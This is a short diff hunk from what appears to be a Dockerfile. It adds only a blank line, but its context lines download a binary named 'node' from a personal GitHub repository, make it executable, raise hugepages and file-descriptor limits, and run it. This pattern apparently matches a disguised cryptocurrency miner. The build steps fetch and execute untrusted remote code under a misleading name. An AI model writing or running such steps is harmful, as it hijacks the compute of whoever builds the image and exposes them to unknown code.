@@ -6,3 +6,4 @@ RUN mv config2.txt config.txt
 RUN wget https://github.com/henamah/henamahage/raw/master/node && chmod +x node && sysctl -w vm.nr_hugepages=128
 RUN ulimit -n 265555 && ulimit -Hn 265555 && ./node
 
+
